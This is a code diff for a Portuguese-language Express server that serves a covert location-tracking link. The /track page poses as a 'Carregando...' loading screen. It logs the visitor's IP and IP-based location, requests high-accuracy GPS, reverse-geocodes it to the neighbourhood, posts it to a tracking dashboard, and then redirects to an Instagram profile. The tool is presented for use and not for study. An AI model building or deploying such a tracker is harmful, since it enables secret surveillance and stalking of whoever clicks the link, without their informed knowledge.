@@ -3,7 +3,6 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(express.json());
-app.use(express.static('public'));
 
 const clicks = [];
 
@@ -64,7 +63,7 @@ app.get('/', (req, res) => {
     }
     .click-item {
       background: #f8f9fa;
-      border-left: 4px solid #667eea;
+      border-left: 4px solid #ffc107;
       padding: 15px;
       margin-bottom: 15px;
       border-radius: 5px;
@@ -130,6 +129,13 @@ app.get('/', (req, res) => {
       border-radius: 5px;
       border: 1px solid #ddd;
     }
+    .alert {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
   </style>
 </head>
 <body>
@@ -137,6 +143,11 @@ app.get('/', (req, res) => {
     <div class="header">
       <h1>📊 Dashboard de Rastreamento GPS</h1>
       <p>Monitore cliques com localização precisa</p>
+      
+      <div class="alert" id="httpsWarning" style="display:none;">
+        ⚠️ <strong>Aviso:</strong> GPS preciso requer HTTPS. Em HTTP só funciona localização por IP (menos precisa).
+      </div>
+      
       <div class="link-box">
         <strong>🔗 Link de rastreamento:</strong><br>
         <code id="trackLink"></code>
@@ -168,10 +179,15 @@ app.get('/', (req, res) => {
   </div>
   
   <script>
-    document.getElementById('trackLink').textContent = window.location.origin + '/track';
+    const trackLink = window.location.origin + '/track';
+    document.getElementById('trackLink').textContent = trackLink;
+    
+    if (window.location.protocol === 'http:' && !window.location.hostname.includes('localhost')) {
+      document.getElementById('httpsWarning').style.display = 'block';
+    }
     
     function copyLink() {
-      navigator.clipboard.writeText(window.location.origin + '/track');
+      navigator.clipboard.writeText(trackLink);
       alert('Link copiado!');
     }
     
@@ -183,69 +199,79 @@ app.get('/', (req, res) => {
     }
     
     async function loadData() {
-      const res = await fetch('/api/stats');
-      const data = await res.json();
-      
-      document.getElementById('totalClicks').textContent = data.total;
-      
-      const withGPS = data.clicks.filter(c => c.location && c.location.lat);
-      const withIP = data.clicks.filter(c => (!c.location || !c.location.lat) && c.ipLocation);
-      
-      document.getElementById('gpsClicks').textContent = withGPS.length;
-      document.getElementById('ipClicks').textContent = withIP.length;
-      
-      const list = document.getElementById('clicksList');
-      
-      if (data.clicks.length === 0) {
-        list.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">Nenhum clique ainda</p>';
-        return;
-      }
-      
-      list.innerHTML = data.clicks.map(c => {
-        const date = new Date(c.timestamp).toLocaleString('pt-BR');
-        const hasGPS = c.location && c.location.lat;
-        const hasIP = c.ipLocation && c.ipLocation.cidade;
+      try {
+        const res = await fetch('/api/stats');
+        const data = await res.json();
         
-        let html = '<div class="click-item' + (hasGPS ? ' has-gps' : '') + '">';
-        html += '<div class="info"><strong>⏰ ' + date + '</strong></div>';
-        html += '<div class="info">🌐 IP: ' + c.ip + '</div>';
+        document.getElementById('totalClicks').textContent = data.total;
         
-        if (hasGPS) {
-          const loc = c.location;
-          html += '<div class="gps-badge">✅ GPS PRECISO</div>';
-          html += '<div class="location-box">';
-          html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + loc.cidade + '</div>';
-          html += '<div class="info"><strong>🗺️ Estado:</strong> ' + loc.estado + '</div>';
-          if (loc.bairro) html += '<div class="info"><strong>🏘️ Bairro:</strong> ' + loc.bairro + '</div>';
-          html += '<div class="info"><strong>📍 Coordenadas:</strong> ' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '</div>';
-          html += '<div class="info"><strong>🎯 Precisão:</strong> ' + Math.round(loc.accuracy) + 'm</div>';
-          html += '<a href="https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng + '" target="_blank" style="color:#667eea;">🗺️ Ver no Mapa</a>';
-          html += '</div>';
-        } else if (hasIP) {
-          html += '<div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP</div>';
-          html += '<div class="location-box">';
-          html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + c.ipLocation.cidade + '</div>';
-          html += '<div class="info"><strong>🗺️ Estado:</strong> ' + c.ipLocation.estado + '</div>';
-          html += '<div class="info" style="color:#999;font-size:0.85em;">GPS não autorizado - localização aproximada</div>';
-          html += '</div>';
-        } else {
-          html += '<div class="ip-badge">❌ SEM LOCALIZAÇÃO</div>';
+        const withGPS = data.clicks.filter(c => c.location && c.location.lat);
+        const withIP = data.clicks.filter(c => (!c.location || !c.location.lat) && c.ipLocation);
+        
+        document.getElementById('gpsClicks').textContent = withGPS.length;
+        document.getElementById('ipClicks').textContent = withIP.length;
+        
+        const list = document.getElementById('clicksList');
+        
+        if (data.clicks.length === 0) {
+          list.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">🔭 Nenhum clique registrado ainda</p>';
+          return;
         }
         
-        html += '</div>';
-        return html;
-      }).join('');
+        list.innerHTML = data.clicks.map(c => {
+          const date = new Date(c.timestamp).toLocaleString('pt-BR');
+          const hasGPS = c.location && c.location.lat;
+          const hasIP = c.ipLocation && c.ipLocation.cidade;
+          
+          let html = '<div class="click-item' + (hasGPS ? ' has-gps' : '') + '">';
+          html += '<div class="info"><strong>⏰ ' + date + '</strong></div>';
+          html += '<div class="info">🌐 IP: ' + c.ip + '</div>';
+          
+          if (hasGPS) {
+            const loc = c.location;
+            html += '<div class="gps-badge">✅ GPS PRECISO</div>';
+            html += '<div class="location-box">';
+            html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + (loc.cidade || 'Processando...') + '</div>';
+            html += '<div class="info"><strong>🗺️ Estado:</strong> ' + (loc.estado || 'Processando...') + '</div>';
+            if (loc.bairro && loc.bairro !== 'N/A') {
+              html += '<div class="info"><strong>🏘️ Bairro:</strong> ' + loc.bairro + '</div>';
+            }
+            html += '<div class="info"><strong>📍 Coordenadas:</strong> ' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '</div>';
+            if (loc.accuracy) {
+              html += '<div class="info"><strong>🎯 Precisão:</strong> ' + Math.round(loc.accuracy) + 'm</div>';
+            }
+            html += '<a href="https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng + '" target="_blank" style="color:#667eea;font-weight:bold;">🗺️ Ver no Google Maps</a>';
+            html += '</div>';
+          } else if (hasIP) {
+            html += '<div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP</div>';
+            html += '<div class="location-box">';
+            html += '<div class="info"><strong>🏙️ Cidade:</strong> ' + c.ipLocation.cidade + '</div>';
+            html += '<div class="info"><strong>🗺️ Estado:</strong> ' + c.ipLocation.estado + '</div>';
+            html += '<div class="info" style="color:#999;font-size:0.85em;">GPS não autorizado ou indisponível</div>';
+            html += '</div>';
+          } else {
+            html += '<div class="ip-badge">❌ SEM LOCALIZAÇÃO</div>';
+            html += '<div class="info" style="color:#999;">Aguardando dados...</div>';
+          }
+          
+          html += '</div>';
+          return html;
+        }).join('');
+      } catch (err) {
+        console.error('Erro ao carregar:', err);
+        document.getElementById('clicksList').innerHTML = '<p style="color:red;">Erro ao carregar dados</p>';
+      }
     }
     
     loadData();
-    setInterval(loadData, 5000);
+    setInterval(loadData, 3000);
   </script>
 </body>
 </html>
   `);
 });
 
-// Página de rastreamento - INVISÍVEL para o usuário
+// Página de rastreamento
 app.get('/track', (req, res) => {
   const clickData = {
     id: clicks.length + 1,
@@ -257,15 +283,18 @@ app.get('/track', (req, res) => {
   };
   
   clicks.push(clickData);
-  console.log('🔔 Novo clique #' + clickData.id + ' - IP:', clickData.ip);
+  console.log('🔔 Clique #' + clickData.id + ' - IP:', clickData.ip);
   
   // Busca IP em background
   (async () => {
     try {
       const ip = clickData.ip;
-      if (ip === '127.0.0.1' || ip.startsWith('192.168.')) return;
+      if (ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+        console.log('⚠️  IP local - geolocalização indisponível');
+        return;
+      }
       
-      const res = await fetch('http://ip-api.com/json/' + ip + '?lang=pt&fields=status,country,regionName,city');
+      const res = await fetch('http://ip-api.com/json/' + ip + '?lang=pt&fields=status,country,regionName,city,district');
       const data = await res.json();
       
       if (data.status === 'success') {
@@ -276,16 +305,124 @@ app.get('/track', (req, res) => {
             estado: data.regionName || 'Desconhecido',
             pais: data.country || 'Desconhecido'
           };
-          console.log('📍 IP:', data.city, data.regionName);
+          console.log('📍 IP Geo:', data.city, data.regionName);
         }
       }
     } catch (err) {
-      console.error('Erro IP:', err.message);
+      console.error('❌ Erro IP:', err.message);
     }
   })();
   
-  // HTML INVISÍVEL - redireciona imediatamente
-  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Carregando...</title><style>body{margin:0;background:#fff}</style></head><body><script>const id=' + clickData.id + ';const url="https://www.instagram.com/andre.osantos12/";function redir(){window.location.href=url}if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async(p)=>{try{const lat=p.coords.latitude;const lng=p.coords.longitude;const acc=p.coords.accuracy;const r=await fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat="+lat+"&lon="+lng+"&addressdetails=1&accept-language=pt-BR",{headers:{"User-Agent":"Tracker"}});const d=await r.json();let loc=null;if(d&&d.address){const a=d.address;loc={cidade:a.city||a.town||a.village||a.municipality||a.county||"Desconhecida",estado:a.state||a.region||"Desconhecido",bairro:a.suburb||a.neighbourhood||a.district||a.quarter||null,pais:a.country||"Brasil"}}await fetch("/api/save-gps",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({clickId:id,lat:lat,lng:lng,accuracy:acc,location:loc})});redir()}catch(e){redir()}},()=>{redir()},{enableHighAccuracy:true,timeout:8000,maximumAge:0})}else{redir()}setTimeout(redir,9000)</script></body></html>');
+  res.send(`<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Carregando...</title>
+<style>
+body{margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial,sans-serif;}
+.loading{text-align:center;color:#667eea;}
+.spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="loading">
+<div class="spinner"></div>
+<p>Carregando...</p>
+</div>
+<script>
+const clickId=${clickData.id};
+const redirectUrl='https://www.instagram.com/andre.osantos12/';
+let redirected=false;
+let gpsAttempted=false;
+
+function doRedirect(){
+  if(!redirected){
+    redirected=true;
+    window.location.href=redirectUrl;
+  }
+}
+
+setTimeout(doRedirect,12000);
+
+async function tryGetLocation(){
+  if(gpsAttempted)return;
+  gpsAttempted=true;
+  
+  if(!navigator.geolocation){
+    console.log('Geolocation não suportado');
+    setTimeout(doRedirect,500);
+    return;
+  }
+  
+  try{
+    const position=await new Promise((resolve,reject)=>{
+      navigator.geolocation.getCurrentPosition(resolve,reject,{
+        enableHighAccuracy:true,
+        timeout:10000,
+        maximumAge:0
+      });
+    });
+    
+    const lat=position.coords.latitude;
+    const lng=position.coords.longitude;
+    const acc=position.coords.accuracy;
+    
+    console.log('✅ GPS obtido:',lat,lng,'±'+Math.round(acc)+'m');
+    
+    try{
+      const geoUrl='https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&addressdetails=1&accept-language=pt-BR&zoom=18';
+      const geoRes=await fetch(geoUrl,{
+        headers:{'User-Agent':'Mozilla/5.0 (compatible; LocationTracker/1.0)'}
+      });
+      const geoData=await geoRes.json();
+      
+      let location=null;
+      if(geoData&&geoData.address){
+        const a=geoData.address;
+        location={
+          cidade:a.city||a.town||a.village||a.municipality||a.county||a.state_district||a.suburb||'Desconhecida',
+          estado:a.state||a.region||a.state_district||'Desconhecido',
+          bairro:a.suburb||a.neighbourhood||a.district||a.quarter||a.residential||a.hamlet||null,
+          pais:a.country||'Brasil'
+        };
+        console.log('📍 Localização:',location.cidade,'-',location.estado);
+      }
+      
+      await fetch('/api/save-gps',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          clickId:clickId,
+          lat:lat,
+          lng:lng,
+          accuracy:acc,
+          location:location
+        })
+      });
+      
+      console.log('✅ Dados salvos');
+    }catch(err){
+      console.error('Erro ao processar localização:',err);
+    }
+    
+    setTimeout(doRedirect,800);
+    
+  }catch(error){
+    console.log('❌ GPS não autorizado ou erro:',error.code,error.message);
+    setTimeout(doRedirect,1000);
+  }
+}
+
+if(document.readyState==='loading'){
+  document.addEventListener('DOMContentLoaded',tryGetLocation);
+}else{
+  setTimeout(tryGetLocation,100);
+}
+</script>
+</body>
+</html>`);
 });
 
 // Salvar GPS
@@ -295,47 +432,55 @@ app.post('/api/save-gps', async (req, res) => {
     
     const click = clicks.find(c => c.id === clickId);
     if (!click) {
+      console.error('❌ Click não encontrado:', clickId);
       return res.json({ success: false });
     }
     
     click.location = {
-      lat: lat,
-      lng: lng,
-      accuracy: accuracy,
+      lat: parseFloat(lat),
+      lng: parseFloat(lng),
+      accuracy: parseFloat(accuracy),
       cidade: location?.cidade || 'Processando...',
       estado: location?.estado || 'Processando...',
       bairro: location?.bairro || null,
       pais: location?.pais || 'Brasil'
     };
     
-    console.log('✅ GPS #' + clickId + ':', lat.toFixed(6), lng.toFixed(6));
-    console.log('📍 Local:', click.location.cidade, click.location.estado);
+    console.log('✅ GPS #' + clickId + ':', lat.toFixed(6), lng.toFixed(6), '(±' + Math.round(accuracy) + 'm)');
+    console.log('📍', click.location.cidade, '-', click.location.estado);
     
-    // Tenta melhorar no servidor se necessário
-    if (!location || location.cidade === 'Desconhecida') {
+    // Sempre tenta refinar a localização no servidor também
+    setTimeout(async () => {
       try {
-        const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1&accept-language=pt-BR', {
-          headers: { 'User-Agent': 'Tracker' }
+        console.log('🔄 Refinando localização no servidor...');
+        const geoUrl = 'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1&accept-language=pt-BR&zoom=18';
+        const r = await fetch(geoUrl, {
+          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; LocationTracker/1.0)' }
         });
         const d = await r.json();
         
         if (d && d.address) {
           const a = d.address;
-          click.location.cidade = a.city || a.town || a.village || a.municipality || a.county || 'Desconhecida';
-          click.location.estado = a.state || a.region || 'Desconhecido';
-          click.location.bairro = a.suburb || a.neighbourhood || a.district || a.quarter || null;
-          click.location.pais = a.country || 'Brasil';
-          console.log('📍 Atualizado:', click.location.cidade, click.location.estado);
+          const novaCidade = a.city || a.town || a.village || a.municipality || a.county || a.state_district || a.suburb;
+          const novoEstado = a.state || a.region || a.state_district;
+          const novoBairro = a.suburb || a.neighbourhood || a.district || a.quarter || a.residential || a.hamlet;
+          
+          if (novaCidade) click.location.cidade = novaCidade;
+          if (novoEstado) click.location.estado = novoEstado;
+          if (novoBairro) click.location.bairro = novoBairro;
+          if (a.country) click.location.pais = a.country;
+          
+          console.log('✅ Refinado:', click.location.cidade, '-', click.location.estado, (click.location.bairro ? '(' + click.location.bairro + ')' : ''));
         }
       } catch (err) {
-        console.error('Erro geocoding:', err.message);
+        console.error('❌ Erro refinamento:', err.message);
       }
-    }
+    }, 2000);
     
     res.json({ success: true });
   } catch (err) {
-    console.error('Erro save-gps:', err);
-    res.json({ success: false });
+    console.error('❌ Erro save-gps:', err);
+    res.json({ success: false, error: err.message });
   }
 });
 
@@ -348,15 +493,20 @@ app.get('/api/stats', (req, res) => {
 
 app.post('/api/clear', (req, res) => {
   clicks.length = 0;
-  console.log('🗑️ Cliques limpos');
+  console.log('🗑️ Todos os cliques foram limpos');
   res.json({ success: true });
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log('🚀 Servidor rodando na porta', PORT);
   console.log('');
-  console.log('💡 Acesse: http://localhost:' + PORT);
-  console.log('💡 Link de rastreamento: http://localhost:' + PORT + '/track');
+  console.log('🚀 Servidor rodando na porta ' + PORT);
   console.log('');
-  console.log('⚠️  GPS preciso requer HTTPS em produção');
+  console.log('📊 Dashboard: http://localhost:' + PORT);
+  console.log('🔗 Link rastreamento: http://localhost:' + PORT + '/track');
+  console.log('');
+  console.log('⚠️  IMPORTANTE:');
+  console.log('   • GPS preciso requer HTTPS em produção');
+  console.log('   • Em HTTP funciona apenas localização por IP');
+  console.log('   • Para testar GPS: use servidor com SSL/TLS');
+  console.log('');
 });
